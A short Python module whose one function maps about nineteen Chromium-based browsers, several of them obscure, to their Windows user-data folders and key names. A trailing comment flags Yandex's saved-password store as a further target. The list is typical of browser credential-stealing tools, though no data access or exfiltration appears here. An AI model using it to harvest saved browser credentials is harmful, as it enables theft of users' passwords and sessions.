import os



def allBrowsersPath() -> dict[str, dict[str, str]]:

    APPDATA = os.getenv('APPDATA')
    LOCALAPPDATA = os.getenv('LOCALAPPDATA')

    return {
        'opera': {
            "path_data": os.path.join(APPDATA, 'Opera Software', 'Opera Stable'),
            "key_name": "Opera Stable"
        },
        'opera-gx': {
            "path_data": os.path.join(LOCALAPPDATA, 'Opera Software', 'Opera GX Stable'),
            "key_name": "Opera GX Stable"
        },
        'amigo': {
            "path_data": os.path.join(APPDATA, 'Amigo', 'User Data'),
            "key_name": "Amigo Browserkey1"
        },
        'torch': {
            "path_data": os.path.join(APPDATA, 'Torch', 'User Data'),
            "key_name": "Torch Media Inc.key1"
        },
        'kometa': {
            "path_data": os.path.join(APPDATA, 'Kometa', 'User Data'),
            "key_name": "Kometa Browserkey1"
        },
        'orbitum': {
            "path_data": os.path.join(APPDATA, 'Orbitum', 'User Data'),
            "key_name": "Orbitum Browserkey1"
        },
        'cent-browser': {
            "path_data": os.path.join(APPDATA, 'CentBrowser', 'User Data'),
            "key_name": "Cent Studio Browserkey1"
        },
        '7star': {
            "path_data": os.path.join(APPDATA, '7Star', '7Star', 'User Data'),
            "key_name": "7Star Browserkey1"
        },
        'sputnik': {
            "path_data": os.path.join(APPDATA, 'Sputnik', 'Sputnik', 'User Data'),
            "key_name": "Sputnik Browserkey1"
        },
        'vivaldi': {
            "path_data": os.path.join(LOCALAPPDATA, 'Vivaldi', 'User Data'),
            "key_name": "Vivaldi Technologieskey1"
        },
        'google-chrome-sxs': {
            "path_data": os.path.join(LOCALAPPDATA, 'Google', 'Chrome SxS', 'User Data'),
            "key_name": "Google Chrome SxSkey1"
        },
        'google-chrome': {
            "path_data": os.path.join(LOCALAPPDATA, 'Google', 'Chrome', 'User Data'),
            "key_name": "Google Chromekey1"
        },
        'google-chromium' : {
            # C:\Users\yoi\AppData\Local\Chromium\User Data
            "path_data" : os.path.join(LOCALAPPDATA, "Chromium", "User Data"),
            "key_name": "Google Chromekey1"
        },
        'epic-privacy-browser': {
            "path_data": os.path.join(LOCALAPPDATA, 'Epic Privacy Browser', 'User Data'),
            "key_name": "Epic Softwarekey1"
        },
        'microsoft-edge': {
            "path_data": os.path.join(LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data'),
            "key_name": "Epic Softwarekey1"
        },
        'uran': {
            "path_data": os.path.join(LOCALAPPDATA, 'uCozMedia', 'Uran', 'User Data'),
            "key_name": "uCoz Media Urankey1"
        },
        'brave': {
            "path_data": os.path.join(LOCALAPPDATA, 'BraveSoftware', 'Brave-Browser', 'User Data'),
            "key_name": "Brave Softwarekey1"
        },
        'iridium': {
            "path_data": os.path.join(LOCALAPPDATA, 'Iridium', 'User Data'),
            "key_name": "Iridium Browserkey1"
        },
        'yandex' : {
            "path_data" : os.path.join(LOCALAPPDATA, "Yandex", "YandexBrowser", "User Data")
        }
    }
    
    # add this "C:\Users\yoi\AppData\Local\Yandex\YandexBrowser\User Data\Default\Ya Passman Data"